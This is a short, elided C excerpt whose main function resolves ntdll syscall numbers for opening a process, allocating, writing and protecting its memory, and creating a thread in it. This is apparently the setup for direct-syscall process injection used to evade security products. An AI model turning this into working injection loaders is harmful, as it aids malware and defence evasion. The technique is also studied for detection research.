...
int main(int argc, char* argv[]) {
	...
	GetSyscallNumber(hNTDLL, "NtOpenProcess", &NTOPENPROCESS_SSN);
	GetSyscallNumber(hNTDLL, "NtAllocateVirtualMemory", &NTALLOC_SSN);
	GetSyscallNumber(hNTDLL, "NtWriteVirtualMemory", &NTWRITE_SSN);
	GetSyscallNumber(hNTDLL, "NtProtectVirtualMemory", &NTPROTECT_SSN);
	GetSyscallNumber(hNTDLL, "NtCreateThreadEx", &NTCREATETHREAD_SSN);
	GetSyscallNumber(hNTDLL, "NtWaitForSingleObject", &NTWAIT_SSN);
	GetSyscallNumber(hNTDLL, "NtFreeVirtualMemory", &NTFREE_SSN);
	GetSyscallNumber(hNTDLL, "NtClose", &NTCLOSE_SSN);
